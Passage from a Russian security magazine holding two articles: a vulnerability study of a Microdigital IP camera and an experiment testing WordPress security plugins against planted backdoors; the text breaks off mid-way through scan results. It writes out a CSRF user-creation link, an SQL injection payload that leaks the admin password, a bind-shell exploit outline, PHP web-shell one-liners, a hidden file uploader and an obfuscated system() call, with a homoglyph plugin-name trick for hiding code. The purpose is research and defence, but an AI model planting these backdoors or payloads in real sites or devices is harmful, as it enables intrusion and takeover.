И получение списка файлов в директории /updownload/ через консоль Bash.





На этом мы можем завершить изу чение скриптов на PHP и перейдем к самой
большой части иссле дова ния — CGI‐приложениям.
  Приложения CGI на IP‐камере отвечают чуть ли не за все действия в адми‐
нистраторской веб‐панели, начиная с авторизации и заканчивая обновле‐
нием устройства.
  Я разделю описание работы на тестирование «невооруженным глазом»
(уязвимости, для нахождения которых не нужно реверсить исполня емые фай‐
лы) и собственно реверс этих самых бинарей.
  При тестировании «нево оруженным глазом» нашлись две уязвимости.
Первая позволяет проводить ата ки подделки межсай товых запросов (то есть
CSRF). Ее суть заключается в том, что можно применить социальную инже‐
нерию и  заставить администратора перей ти по  вредонос ной ссылке.
Это дает возможность выполнить почти любую команду из админского
интерфейса. Например, можно сделать вот такую ссылку:


/webparam?user&action=set&param=add&id=tester&pass=cGFzc3dvcmQ=&
authority=0&t=1552491782708

Она будет создавать поль зователя tester с паролем password.





Когда я изучал трафик в Burp Suite, я долго не мог найти ответ сервера, где
браузеру высылаются cookie с данными авто риза ции (username, auth и pass‐
word). Оказалось, что искал зря: эти данные выс тавля ются на стороне клиента
через код на JavaScript в файле /inc/js/ui.js.





То есть браузер сначала делает зап рос на проверку логина и пароля и, если
результат положительный, сохраняет зна чения логина, пароля и привилегий
в соответствующие cookie. А дальше эти куки используются при отправке
командных запросов, например при соз дании нового пользовате ля.





Тут‐то и появляется вторая уязвимость: даже если мы не отправим cookie‐
переменную password, сервер все равно успешно обработает наш запрос!





То есть достаточно знать логин админа (который по умолчанию — root), чтобы
обойти авторизацию и совершать любые вызовы, доступные админис тратору
в административной веб‐консоли камеры! И это мы нашли, даже не изучая
код приложения. Посмотрим, что же будет в самом коде.


ИЗУЧЕНИЕ БИНАРНЫХ ПРИЛОЖЕНИЙ
Для изучения исполняемых файлов потребова лись некоторые приготовления.
А именно:
 • установка статически скомпилированного отладчика GDB из публичных
   репозиториев на GitHub;
 • установка карточки MicroSD с файловой системой VFAT (что позволяет
   получить допол нительное мес то).

Сам процесс иссле дования скомпилированных приложений выглядит так.
 1. Изучение приложения в IDA Pro.
 2. При необходимости — отладка приложения в GDB на самой камере через
    Telnet. Кстати, посколь ку приложение мно гопо точное, пришлось каждый
   раз проверять нужный process id для вза имодействия с определенным
   потоком (поток создается до обработки запроса).
 3. Написание proof‐of‐concept для демонс трации уязвимости.

Почти все командные веб‐зап росы отправлялись по адре су /webparams. Изу‐
чив настройки httpd, которые хранятся в файле /usr/local/httpd/conf/
httpd.conf, определяем, что все запросы на /webparam перенаправляются
в исполняемый файл FCGI по пути /usr/local/httpd/fcgi/webparams.
fcgi.





Это исполняемый файл для 32‐битного ARM. На нем‐то я и решил сконцен‐
трироваться.





Про извольные коман ды FTP
Камера может  отправлять  записи  на  удаленный  сетевой  FTP‐сервер.
Для настройки конфигурации подключения есть отдельная веб‐форма.





Далее можно нажать на кнопку Test и про верить соединение. Будет вызвана
функция по адресу 0xaeb0. Для удобс тва будем изучать псевдокод функции,
полученный при помощи Hex‐Rays Decompiler.
 1. Создание подклю чения.



 2. Авторизация на FTP‐сервере.




 3. Смена текущей директории значени ем, переданным аргу ментом.




 4. Создание временного файла.





Проблема безопасности обна ружилась уже на треть ем пункте. Функция ft‐
p_CWD, находящаяся по сдвигу 0xA9F0, не проверяет наличие в строке‐пути
некорректных символов, таких как перенос строки.





Это  позволяет  отправлять произвольные  команды FTP —  достаточно
добавить байты \r\n в зна чение директории для загрузки фай лов. Значит, мы
нашли SSRF.
  Например, можно сделать зап рос к FTP‐серверу камеры и добавить
к нему команду, которая соз дает директорию /tmp/123 (GET‐переменная
uploadpath как раз отвечает за путь до требуемой директории).





Переходим в /tmp/ на камере и видим соз данную папку 123.





Path Traversal и про верка наличия файлов
Следующая интересующая нас воз можность веб‐сервера — синхронизации
часов по протоколу NTP.





За изменение параметров отвечает функция по сдвигу 0x12564. Не будем
вдаваться  детально  в  прин цип  ее  работы,  обратим  лишь  внимание
на переменную TZ (Time Zone).
 1. Первые 32 байта GET‐параметра TZ заносят ся в переменную get_TZ_32b.


 2. Значение конкатенируется с путем до директории, где хранятся настройки
   временных зон, и проверяется наличие такой директории (или файла)
   в файловой системе устройства.



 3. В случае успеха далее идут разные дей ствия, на выполнение которых нуж‐
   но время. Например, запросы в базу данных.




Если объединить все три пункта, то получится, что мы можем не только
манипулировать пол ным адресом директории (Path Traversal), но и опре‐
делять по ответу от сервера наличие файла в файловой системе. Чтобы удос‐
товериться в этом, отправляем запрос, который проверит, существу ет ли
файл /etc/passwd.





И посмотрим, что будет, если файла нет.





                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
   ВСКРЫТАЯ КАМЕРА
                          КАК ИСКАТЬ УЯЗВИМОСТИ
                 В «УМНЫХ» ГАДЖЕТАХ НА ПРИМЕРЕ
                       ПОПУЛЯРНОЙ IP‐КАМЕРЫ





SQL-инъ екция
Переходим к более серьезным уязвимостям. Конфиги камеры хранятся
в базе SQLite 3, и почти все действия на веб‐сервере приводят к взаимодей‐
ствию с ней. Так вот, оказалось, что почти все запросы к базе данных со стро‐
ковыми параметрами могут проходить с некорректно форматированным вво‐
дом. А это, как ты мог догадать ся, SQL injection! Для примера разберем одну
из уязвимых форм — форму редактирова ния настроек DNS.





При редактировании этих параметров отправляются два запроса на сер‐
вер — запрос на модификацию информа ции и зап рос на получение текущих
настроек.
  Пример запроса на модификацию информации.





За обработку такого запроса отвечает функция по сдвигу 0x18374. В начале
идет считывание GET‐парамет ров запроса (до 32 байт каждый) и проверка
того, заполнены ли они.





Далее —  вызов функции  strip,  которая  убирает символы  «пробел»
и «табуляция» в начале и в конце строк.





Теперь получен ные строки отправляют ся в функцию, которая делает SQL‐
запрос Update к базе данных SQLite 3.





Проблема в том, что при переда че строк используется не %q (безопасный
вариант), а %s, в связи с чем мы можем выйти за пределы строки и добавить
свои SQL‐инструкции в запрос (кста ти, если отправляется целочисленный
параметр, то луч ше всего использовать %d).
  Ниже — пример эксплуатации.





Во время обработки этого зап роса создается следующая команда SQL.


Update Network set DDNSUsage=1, DDNSHostname='', DDNSName=(select/
*', DDNSName='*/Password from/*', DDNSUserName='*/User limit 1) ‐‐
', DDNSPassword='***'

Этот запрос запишет пароль открытым текстом в поле DDNSName первого
аккаунта из таблицы User. Остается запросить текущие настройки DDNS.





В результате мы получили зна чение пароля первого пользователя из таблицы
User — в нашем случае это root/root. Если учесть, что до этого мы нашли спо‐
соб обхода авто ризации, получа ется, пароль админа может узнать любой
неавторизованный пользователь.
   Аналогичную проб лему можно наб людать еще  у 25 различных GET‐
параметров, разбросанных по всему веб‐серверу (часть параметров тре‐
буется предварительно кодировать в Base64).


Пе репол нение сте ка
Когда я перебирал параметры, подверженные ата кам типа SQL injection, мое
внимание привлекла функция, которая обра баты вает переменную action,
расположенную по смещению 0x155D0. Начало псевдокода функции —
на скриншоте.





На 78‐й строке вызывается функция GET_val. Она в качестве аргу мента при‐
нимает строку — название GET‐переменной и возвращает строку — зна‐
чение этой переменной.
  Далее вызывается функция strcat, которая при нимает на вход два ука‐
зателя на строки и записывает по первому ука зателю результат конкатенации
этих двух строк. Проб лема заключа ется в том, что функция strcat может
вызывать ошибку переполнения буфера. Ошиб ка воз никает при условии, что
выделенной памяти на стеке для первой переменной не будет хватать
для хранения результата сло жения двух строк и произойдет переполнение
стека.
  Первый аргумент функции был объявлен на 53‐й строке.




Для этой строки выделяется четыре байта, а потом в первую ячейку помеща‐
ется нулевой байт, обознача ющий ее окончание.




Выходит, что для переполнения стека пот ребуется в аргументы функции str‐
cat отправить две строки. Тог да длина второй стро ки будет больше трех байт
(четвертый байт нулевой и выставляется автоматически).
  Переходим в стадию экс плуатации найденной уязвимости. Для начала
проверяем, какие защиты включены у исполняемого файла.





Флаг NX отключен, а это значит, что можно исполнить код, рас положенный
в любой области памяти, — в том числе тот, который мы разместим в процес‐
се работы.
   Также проверим, включена ли в системе  технология рандомизации
адресного пространства.




Флаг 1 означает, что адрес стека будет случайным при каждом запуске.
Но изначально второй аргумент функции strcat (то есть аргумент GET‐
переменной action) записывается в кучу, а зна чит, мы можем им восполь‐
зоваться.
  При отладке программы оказалось, что адрес воз врата функции, которая
вызывает strcat, хранится со сдвигом в 52 байта.
   Удостовериться в этом можно, отправив следующий запрос.





При отладке про цесса исполняемо го файла webparam.fcgi получаем ошиб‐
ку программы, которая пытается перейти по адресу BBBB.





Теперь остается дописать исполняемый код (шелл‐код) после адреса воз‐
врата и перезаписать адрес воз вра та на адрес нашего вре доносного кода,
который хранится на  куче. В примере используется исполняемый  код,
который открывает порт 10240 и дает дос туп в командную оболочку без авто‐
ризации (Bind Shell).





  Запрос с перезаписыванием адреса возврата на адрес шелл‐кода
  (0x00058248)

Проверяем сетевую активность на устрой стве.





Процесс   1263   программы   webparam.fcgi   начал   прослушивать
порт 10240 на всех интерфейсах. Подключимся к нему через netcat.




Нам доступен шелл с привилегиями пользователя nobody.
   Аналогичная проб лема переполнения буфера и у переменной params.
Способ эксплуатации не силь но отличает ся от описанного, поэтому не будем
на нем останавливаться.


Под мена файла про шивки
Одна из самых популярных проб лем у устройств IoT — это отсутс твие подписи
у файла прошивки. Конечно же, она не обошла и эту камеру. Что это нам
дает? Все просто: мы можем добавить свой код в прошивку устройства
и таким образом заразить его, причем так, что вос становление будет воз‐
можно, только если имеется дамп памяти, а есть он (и необходимые навыки)
далеко не у любого владельца.
  Администраторам устройства доступен интерфейс для обновления про‐
шивки (внизу страницы).





Тут самое время вспомнить про файл про шивки, который мы скачивали
с официального сайта в самом начале статьи.





Это .tar, в котором лежат файлы PackageInfo.txt и UpdatePackage_6400.0.
8.5.bin. Второй, в свою очередь, оказался архи вом.





После распаков ки нам стала доступна следующая фай ловая иерархия.





В директориях хранятся все те же файлы, что и в файловой системе камеры.
То есть мы можем подменить один из них, упа ковать прошивку и отправить
в качестве обновления. Но нужно еще заглянуть в файл PackageInfo.txt,
доступный после первого разархивирования.





На восьмой стро ке ука зывается контрольная сумма файла  .bin. То есть
это поле тоже потребуется отредактировать при отправке кастомной прошив‐
ки, иначе камера посчитает файл поврежденным и система обновлений про‐
игнорирует его. Эту уязвимость можно отнести к типу RCE — удаленное
исполнение произволь ных системных команд.


По выше ние привиле гий
Напоследок — еще одна уяз вимость того же типа, но уже с повышением при‐
вилегий  до   root!  Если  вставить  в  камеру  карточку  MicroSD,  то
из веб‐интерфейса мож но удалять файлы с нее.





При удалении файла браузер отправляет по HTTP вот такой запрос.





За обработ ку запроса на стороне сервера отвечает все то же приложение
webparam.fcgi, но в данном случае оно передает его в другую программу —
MainProc. Это тоже бинарное приложение.
   Изучив MainProc, я определил, что GET‐переменная filename объеди‐
няется со строкой и передается в функцию system без какой‐либо фильтра‐
ции. А это означает, что можно исполнять произвольный код от имени поль‐
зователя, который запустил MainProc, то есть root.





Proof‐of‐concept: создаем файл /tmp/test.txt со строкой hacking.





В совокупности с обходом авториза ции этот баг позволяет злоумышленнику
получить контроль над любой камерой с открытым веб‐интерфейсом. И,
вполне вероятно, использовать его для дальнейших атак.


ПОДВОДИМ ИТОГИ
Во время иссле дования было обнаружено более десяти разных, в том числе
и критических уязвимостей IP‐камеры Microdigital. Пол ный список из двенад‐
цати CVE ты можешь найти по ссылке.
  Важный момент в том, что файл прошивки, предоставленный произво‐
дителем на сайте, общий для всех шести IP‐камер серии N. И вероятнее все‐
го, часть найденных уяз вимос тей присутству ют и в других устройствах Mi‐
crodigital, которых, как говорилось в начале статьи, «свыше 150 моделей»!
   Также стоит упомянуть, что на конференции Positive Hack Days 8 был кон‐
курс на взлом IP‐камер — CAMBreaker. Среди подопытных числилась и эта
модель. Одним из призеров конкурса был Иван Ани сеня, который, как ока‐
залось, еще в прошлом году нашел уязвимость внедрения произвольных
SQL‐запросов и с ее помощью обо шел авториза цию на этой камере.
  Остается животрепещущий вопрос: как защитить периметр от злоумыш‐
ленников, если в нем есть подоб ная камера? Для обеспечения безопасности
нужно:
 • установить камеру в физичес ки недоступном для злоумышленника месте;
 • внимательно изучить документацию;
 • отключить невостребованные сервисы, например FTP;
 • сменить все пароли и, желательно, имена пользовате лей устройства;
 • закрыть на стороне шлюза (чаще всего в роли шлюза выс тупает роутер)
   port‐forwarding до IP‐камеры.

Этим же списком рекомендаций можно руководствоваться при нас тройке
любого другого умного устройства.
ВЗЛОМ

  MALWARE   VS WORDPRESS





    ПРОВЕРЯЕМ ЗАЩИТНЫЕ ПЛАГИНЫ
        В БОЕВЫХ УСЛОВИЯХ





Wordpress — одна из самых распростра‐
ненных сис тем управления сайтом и поэто‐
му   вызывает   пристальный   интерес
у вирусописателей и взломщиков всех мас‐           SUBVΞRSΛ
                                                                                           Dev/Sec/Gfx Freelancer.
                                                                                                  Telegram: @subversaтей. В этой статье речь пойдет о «зак‐
ладках» в коде взломан ных сайтов, а также
о технологиях их выявления.


Мы посмотрим на работу наиболее извес тных плагинов безопасности
для Wordpress в базовой комплектации по прин ципу «нашел в репозитории →
установил → запустил», то есть глазами рядового пользовате ля, без платных
подписок и PRO‐версий. А еще рас смотрим некоторые мифы, касающиеся
качества плагинов и тем из официального репозитория. «Закладки» будут
самыми простыми и без обфуска ции — для удобства эксперимента. При ятно‐
го чтения.


           WARNING

                      Вся информация в этой статье предоставлена
                      исключительно   в   ознакомительных   целях.
                    Ни редакция, ни автор не несут ответственности
                        за любой возможный вред, причиненный матери‐
                       алами дан ной статьи. Помни, что неправомерный
                      доступ  к  компьютерной информации  и  рас‐
                       пространение вредоносного ПО влекут ответс‐
                        твенность согласно статьям 272 и 273 УК РФ.


Если верить статистике, под управлением Wordpress работают чуть более
трети сайтов в интернете. Оно и понятно: этот движок бесплатный, поддержи‐
ваемый сообществом, простой, с  кучей пла гинов и тем оформления,
как платных, так и бесплат ных. Но вместе с этими плюсами есть и довольно
ощутимый минус — безопасность. В большинс тве случаев взломы работа‐
ющих на Wordpress сайтов носят авто матизированный характер. Причина это‐
го — простота применения того или ино го эксплоита и количество уяз вимых
ресурсов. Wordpress и по количес тву «пробивов» также уверенно держит
лидирующие позиции, из‐за чего на фриланс‐биржах и форумах практически
ежедневно можно найти объявления об очередном взломе, с просьбами
вычистить всю малварь и вос ста новить работос пособность поврежденного
ресурса.
  Специфика Wordpress такова, что осмыслен но модифицировать большую
часть файлов ядра бес полезно, так как при обновлении или форсированной
переустановке будут восстановлены оригиналь ные файлы, да и плагины
безопасности в боль шинс тве своем уже давно умеют выявлять эти самые
модификации и предупреждать о них в отчетах. То же самое касается тем
и плагинов из репозитория: любые изменения будут выявлены либо через
сравнение хеш‐сумм файлов, либо через дату изменения. Ины ми словами,
при целенаправленном взло ме ресурса эффективная область заражения
сильно сужается, дабы внедренный код оставался незамеченным как можно
дольше. А вот спам и Black SEO скрипты, которые в принципе не рассчитаны
на продолжительную работу на скомпрометированном ресурсе, чаще все го
засоряют все подряд и без раз бора. Такое ПО довольно легко узнать «по
почерку»: рандомные символы в названиях директорий, большое количество
на первый взгляд бессмысленных файлов, час тичная или полная обфускация
кода.


             INFO

                         Black SEO, «черное» SEO — вид поисковой опти‐
                     мизации, основывающийся на применении явно
                       запрещенных и недобросовестных методов прод‐
                       вижения. Основные методики  «черного» SEO:
                      дорвеи, клоакинг, лин копомойки, избыток рек‐
                      ламы, JavaScript‐редирек ты и прочее. Именно
                        в эти чудеса поисковой оптимизации зачастую
                      и превращаются взломанные сайты на Wordpress.





                 Пример обфусцированного кода





  В каких‐то случаях счет идет на десятки фай лов, а в каких‐то и на тысячи

Нередко именно эти отличитель ные черты и позволя ют даже обычному поль‐
зователю довольно оперативно заметить, что с сайтом творится неладное.
Однако восстановление сайта может сильно затянуться как раз из‐за объ‐
емов вредоносного кода, засорения поисковой выдачи или наложенных
на домен или IP‐адрес санкций. В общем, такая работа вре доносов далека
от ювелирной, а обезопасить себя от этой головной боли зачастую можно
просто своевременным обновлением движка и темы с плагинами.
  Основной  же  и  самый  болезненный  удар  при  заражении  сайта
под управлением  Wordpress приходится на директорию /wp‐content/.
Исключение в последнее время составляет разве что директория /wp‐con‐
tent/uploads/, которую все чаще ста ли закрывать от выполнения PHP‐кода,
что в целом логично, хотя и может в единичных случаях создавать неудобства.
Внутри /wp‐content/ хра нятся и исполь зуемые темы оформления, и пла‐
гины, и файлы кеша, и даже логи с бэкапа ми, если в админке установлены
соответствующие настройки.
  Плагины, особенно если они не обновляются довольно долго, час тенько
и становятся точкой входа для зло умышленника, в то время как директория
с темами /wp‐content/themes/ отлично подходит для внедрения, к примеру,
бэкдора. Почему не наоборот? Потому что с пла гина ми свя зана некая «текуч‐
ка»: сегодня владельцу ресурса нуж ны одни воз можнос ти, а завтра он
передумает и все удалит, уста новив что‐то новое. С темами оформления
такой динамики почти не бывает, что заметно снижает шанс, что вре донос‐
ный код удалят и доступ к ресурсу через тот же бэкдор будет потерян. По этой
причине выгоднее получать дос туп в систему через какой‐то уяз вимый пла‐
гин, а вредоносный код пря тать где‐то в недрах директории /wp‐content/
themes/.


        WWW

                      Изучением уязвимостей в Wordpress специалисты
                      по информационной  безопасности и  частные
                       исследователи занимаются давно и довольно
                        плотно. Вот несколько ссылок для самостоятель‐
                        ного изучения:
                         •https://wpvulndb.com — полезный ресурс, пос‐
                       вященный  уязвимостям  Wordpress:  движок,
                         плагины, темы;
                         •https://github.com/wpscanteam/wpscan/     —
                        наиболее популярный и бесплатный сканер уяз‐
                       вимостей Wordpress;
                           •https://wordpress.org/plugins/wpscan/ — пла гин
                         для   Wordpress,  который   сканирует   сайт
                         на предмет использования уяз вимых версий
                       движка, тем и плагинов по базе WPScan Vulner‐
                                   ability Database.


Занимающиеся безопасностью движка эксперты порой незаслуженно обхо‐
дят вниманием два файла, если они есть в корневой директории: wp‐config.
php и wp‐config‐sample.php. Первый интересен тем, что его довольно час то
редактируют и система, и сам пользователь, и раз личные плагины. По этой
причине некоторые сканеры пропускают его как валидный по умол чанию.
Практика показывает, что в большинс тве случаев вредоносный код там
не вызывает подозрений (речь не про обфусцированный веб‐шелл, разуме‐
ется), и это играет на руку зло умышленникам.
   Второй файл wp‐config‐sample.php вызыва ет восторг одним своим
наличием, так как система использует его всего один раз в виде шаблона
при установке Wordpress, да и удалять его вручную ни пользователи, ни раз‐
работчики не спешат, что также игра ет на руку хакерам. Если хотя бы один
из этих двух файлов есть в корневой директории сайта, то он также отлично
подойдет для внедрения вредоносного кода, хоть это решение и будет «под
носом» у владельца, да и зап росы к это му фай лу в логах сервера могут все же
вызвать подозрения. В общем, «слепых зон» у данной CMS немало, и даже
принудительно внедренный в админку раз дел под наз вани ем «Здоровье сай‐
та» революции не произвел (не говоря о том, что в нем есть весьма спорные
критерии и советы).


МИФЫ И РЕАЛЬНОСТЬ
Со временем вокруг Wordpress сформировались устойчивые заблуждения,
которые я условно назову мифами. Вот основные из них.
 • Миф № 0: качество. Среди разработчиков, модераторов и завсегдатаев
  форума Wordpress быту ет мнение о высоком качестве попадающих в офи‐
   циальный репозиторий тем и плагинов, код которых якобы проходит мно‐
   гочисленные проверки, так что все это доб ро можно смело использовать
   на своих сайтах и особо ни о чем не беспокоить ся. Для сомневающихся
   в такой благодати есть классичес кий способ усы пить бдительность:
   высокие показатели установок и положительные отзывы. Не могут же сот‐
   ни тысяч пользователей ошибаться, верно?
 • Миф № 1: надежность. Wordpress яко бы дает возможность за пару кли‐
   ков обеспечить сайту надежность и защиту, не заплатив при этом
   ни копейки. Еще одно распространенное среди пользователей и пред при‐
  нимателей заблуждение. Под предпринимателя ми подразумеваются те,
   кто использует Wordpress в своем биз несе.
 • Миф № 2: безопасность. на одном извес тном форуме не так давно были
   замечены занятные статьи, затрагива ющие тематику безопас ности раз‐
   личных CMS. Для защиты Wordpress рекомендовали использовать плагины
   безопасности из репозитория, так как автор считает их лучшим и наиболее
   эффективным решением и сам пользуется ими для восстановления
   работоспособности скомпрометированных ресурсов. В других статьях
   для атаки на данную CMS были даны рекомендации, как заражать ресурсы
   и наиболее эффективно скрывать внедренный код. Суть рекомендаций
   сводилась к тому, чтобы напихать куда попало этих самых «закладок»
   в наиболее извращенной манере, и все это в теории поз волит получить
   контроль над ресурсом в час икс.
 • Миф № 3: премиум‐решения (плат ные) лучше базовых (бесплатных).

А теперь я предлагаю взглянуть на более реальную картину, проверив теорию
практикой. То есть экспериментом.


ПОДГОТОВКА CMS
Работать будем, исполь зуя самую пос леднюю версию Wordpress — 5.2.4 (по
состоянию на 6 ноября 2019 года). Все стандартно: штатная установка, далее
сразу удаляем ненужный плагин Akismet Anti‐Spam и любые две темы из трех
доступных. Hello Dolly пока не трогаем, поз же расскажу почему. В итоге
получаем «чистый» Wordpress с единственным изменением в файле wp‐con‐
fig.php:


define( 'WP_DEBUG', true );
define( 'WP_DEBUG_DISPLAY', false );
define( 'WP_DEBUG_LOG', 'wp‐content/versa‐debug‐log.txt' );

Первая строка включает в Wordpress режим отладки, вторая отключает отоб‐
ражение сообщений об ошибках, третья поз воляет вести лог работы движка
и сохранять его в файле журнала с заданным нами име нем. Это не обя‐
зательный шаг, но для эксперимента и отслежива ния ошибок лишним точно
не будет.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
       MALWARE VS
        WORDPRESS
         ПРОВЕРЯЕМ ЗАЩИТНЫЕ ПЛАГИНЫ В БОЕВЫХ
                                  УСЛОВИЯХ





ВЫБОР ПЛАГИНОВ
Может ли владелец скомпрометированного сайта самос тоятельно справить‐
ся с последствиями взло ма, не прибегая к най му спе циалиста? В теории —
да, может, и для это го существу ет огромное количес тво плагинов безопас‐
ности. Первым делом стоит поискать их в официаль ном репозитории Word‐
press по клю чевым словам security и malware.





      Результат поиска в репозитории Wordpress по запросу malware

На почетном первом мес те мы видим безус ловного лидера: Wordfence Secu‐
rity — Firewall & Malware Scan компании Wordfence. Активная разработка, куча
опций  и  настро ек,  более  трех  миллионов  установок,  сред ний  рей‐
тинг 4,8/5 баллов и 3177 положительных отзы вов выглядят убе дительно,
правда? Без платной подписки пользователю дос тупна вся базовая функци‐
ональность с использованием Community‐сигнатур: файрвол, сканер файлов
на наличие малвари и изменений файлов ядра, управление аутентификацией
и прочее. У данного вида сигнатур есть одна особенность — их обновле ние
происходит с задержкой в 30 дней. Забегая вперед, могу сказать, что особой
погоды эта задержка не делает. Тем не менее проверим работу плагина
на простых «закладках» и посмотрим, оправданны ли столь высокие рейтинги.





          Страница плагина Wordfence Security на wordpress.org

На втором месте с сильным отрывом от лидера рас положился плагин iThemes
Security с более чем 900 000 активных установок. Эффективность выявления
мал вари этим плагином мы проверить не сможем, так как модуль сканера
доступен только в PRO‐версии. От себя замечу, что за несколько лет я
довольно часто наблюдал и продолжаю наб людать этот плагин безопасности
на скомпрометированных ресурсах.





           Страница плагина iThemes Security на wordpress.org

Третье место по популярности держит Sucuri Security — Auditing, Malware
Scanner and Security Hardening — продукт компании Sucuri Inc., получивший
рейтинг  4,4/5  баллов  при  254  положи тель ных  отзывах  и  более
чем 600 000 активных уста новок. Проверить эффективность выявления «зак‐
ладок» этим инструментом мы также не сможем из‐за необходимости плат‐
ной подписки.





  Страница плагина Sucuri Security — Auditing, Malware Scanner and Securi‐
   ty Hardening на wordpress.org

Четвертое  место  за  Anti‐Malware   Security  and  Brute‐Force   Firewall:
более 200 000 активных установок, 595 положительных отзы вов и рей‐
тинг 4,9/5 баллов.





  Страница плагина Anti‐Malware Security and Brute‐Force Firewall
  на wordpress.org

На пятом месте мы видим Cerber Security, Antispam & Malware Scan от Cerber
Tech Inc. с более чем 100 000 активных установок, рейтингом 4,9/5 бал лов
и 375 положительными отзывами.





  Страница плагина Cerber Security, Antispam & Malware Scan
  на wordpress.org

Сотни тысяч активных уста новок, высокие рейтинги и хвалебные отзывы —
все прекрасно, но стоит ли это воспринимать букваль но?


             INFO

                     Подготовленный  к  тестам  «чистый» Wordpress
                      просканирован отдельно каждым плагином, что
                       дало ожидаемый результат: ноль срабатываний
                        в каждом отдельном случае, за исключением Anti‐
                       Malware Security and Brute‐Force Firewall, который
                   еще на старте дал восемь ложных сра батываний
                       на файлы ядра движка.



ВНЕДРЕНИЕ ВРЕДОНОСНОГО КОДА
На этой стадии мы начнем внедрять «закладки» в наш тес товый сайт.
Для начала добавим самый простой и очевидный код, который заведомо
будет без проблем выявлен, затем нем ного его скорректируем и продол жим
отслеживать реакцию плагинов безопас ности (если она будет).
 • wpconfig.php — в самый конец файла добавляем строчку system(
  $_GET["subversa"]); .
 • wpconfigsample.php — добавляем код passthru($_GET["sub
  versa"]);exit(); обя зательно перед строчкой require_once(AB
  SPATH . 'wpsettings.php' ); (что бы не выз вать внутреннюю ошиб‐
   ку сервера при обращении к файлу).
 • /wpcontent/index.php, /wpcontent/plugins/index.php, /wp
  content/themes/index.php —  добавляем  echo   shell_exec(
  $_GET["subversa"]); во все три файла.

Создадим отдельную тему и назовем ее, к примеру, Corrupted, пос ле чего
сделаем ее активной. Суть этого действия сос тоит в том, что такой темы
в репозитории Wordpress заведомо нет, следова тельно, она будет считаться
кастомной и ее не с чем будет сравнивать на пред мет целостности
и модификаций. Можно соз дать копию той темы, что мы оставили при под‐
готовке Wordpress.
   Теперь мы модифицируем следующие ее файлы:
 • /wp‐content/themes/corrupted/404.php — в этот файл час то внедряют
   загрузчик файлов, что довольно удобно. Я добавлю вот такой:


   <?php echo "<center><form style='display:none;' method='POST'
   enctype='multipart/form‐data'><input type='file' name='file2u
   pload'><input type='submit' name='upload' value='Upload'></form></
   center>";$files = $_FILES['file2upload']['name'];if(isset($_POST[
   'upload'])){if(@copy($_FILES['file2upload']['tmp_name'], $files)){
   echo "Uploaded";}else{echo "Failed";}} ?>

  В подобных случаях я не замечал добавление стиля вроде display:none;,
   который скрывает заг рузчик от посторонних глаз, что довольно логично
   и практично.
 • В файл /wp‐content/themes/corrupted/functions.php добавим re‐
   quire_once get_template_directory() . "/inc/ghostuser.php";.
 • В файл /wp‐content/themes/corrupted/footer.php добавим <?php
   system($_GET["subversa"]);?>.

Оригинальную тему, что стала неактивной, также немного изменим.
 • В файле /wp‐content/themes/twentysixteen/header.php — добавим
   сразу после ?><!DOCTYPE html> код загрузчика:


   <?php echo "<center><form style='display:none;' method='POST'
   enctype='multipart/form‐data'><input type='file' name='file2u
   pload'> <input type='submit' name='upload' value='Upload'></form>
   </center>";$files = $_FILES['file2upload']['name'];if(isset($_POST
   ['upload'])) {if(@copy($_FILES['file2upload']['tmp_name'], $files
   )){echo "Uploaded";}else{echo "Failed";}} exit();?>

 • Создадим  файл  /wp‐content/themes/twentysixteen/inc/fakefile.
   php с таким содержимым: <?=`$_GET[s]`?>.

Также можно добавить в директорию /wp‐content/ нес колько веб‐шел лов,
чтобы посмотреть, будет ли на них какая‐то реакция со стороны тестиру емых
плагинов. Эти веб‐шеллы широко извес тны и поль зуются популярностью уже
много лет. Найти их в интернете не представляет большой сложности (хотя их
и выпиливают с гитхаба с завидной регулярностью). Речь идет вот об этих
скриптах:
 • /wpcontent/subversa.php
 • /wpcontent/simple.shtml
 • /wpcontent/nbl.php
 • /wpcontent/alfa—3.php
 • /wpcontent/c—7.php
 • /wpcontent/mini47.php
 • /wpcontent/b374k.php
 • /wpcontent/w50.php

И в качестве финального аккорда вернемся к плагину Hello Dolly. Вооб ще,
почему этот плагин остается в комплекте поставки Wordpress в наши дни —
решительно непонятно. Это абсолютно бесполез ный плагин, который еще и
можно использовать в качестве «носителя» вредоносного кода, что делает
ситуацию сов сем странной, учитывая рекомендации из раздела «Здоровье
сайта».





  Один из способов сокрытия файла с вредоносным кодом на странице
  «Плагины»

На скриншоте видно, что админпанель определила сразу два плагина Hello
Dolly, которые визуально неразличимы. Здесь была проделана нехитрая
манипуляция с буквой i: первый по порядку плагин на самом деле называ‐
ется Hello DoIIy (файл heIIo.php — буквы ll заменены на заглавные ii), а вот
второй как раз и есть оригинал. Заметить эксперименты с заглавными
и строчными буквами можно, к примеру, в исходном коде страницы.





  Нужная часть исходного кода страницы «Плагины» в «Инструментах раз‐
  работчика» Google Chrome





             Код, отвечающий за соз дание файла shadow.php

В нашем случае я модифицировал «клон» плагина так, чтобы при обращении
к файлу heIIo.php создавался файл с названи ем /wp‐content/shadow.php
и кодом <?= $s="sy"."st"."em";$v=$_GET["subversa"];$s($v); ?> внут‐
ри. При желании можно «подогнать» под оригинал и размер файла, для боль‐
шей убедительности. Забавно, правда?





                  Плагины Hello Dolly и Hello DoIIy

Всего получилось 20 файлов с вредоносным кодом, которые дол жны без тру‐
да выявить плагины безопас ности. Нас чет веб‐шел лов особых иллюзий
питать не приходится, так как без обфускации плагины могут срабаты вать
почти на каждую строч ку их кода, да и загрузчики фай лов не дол жны вызвать
особой паники у средств безопасности, пос коль ку сам по себе процесс заг‐
рузки файлов является легитимным и час то используется плагинами. В качес‐
тве маленького бонуса я подключу простень кий самописный cookie‐стиллер
на одной из страниц Wordpress в виде отдельного скрипта, вызываемого
тегом <script src=...


СКАНИРОВАНИЕ


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
       MALWARE VS
        WORDPRESS
         ПРОВЕРЯЕМ ЗАЩИТНЫЕ ПЛАГИНЫ В БОЕВЫХ
                                  УСЛОВИЯХ





Wordfence Security – Firewall & Malware Scan
Запускаем первое сканирование в стандартном режиме и, затаив дыхание,
ожидаем, что будет обнаружен весь внедренный код.





   Результат первого запус ка Wordfence Security — Firewall & Malware Scan

12/20. Что было обнаружено на самом деле:
 • wpconfig.php — system();
 • wpconfigsample.php — passthru();
 • wpcontent/nbl.php — веб‐шелл;
 • wpcontent/mini47.php — веб‐шелл;
 • wpcontent/alfa—3.php — веб‐шелл;
 • wpcontent/b374k.php — веб‐шелл;
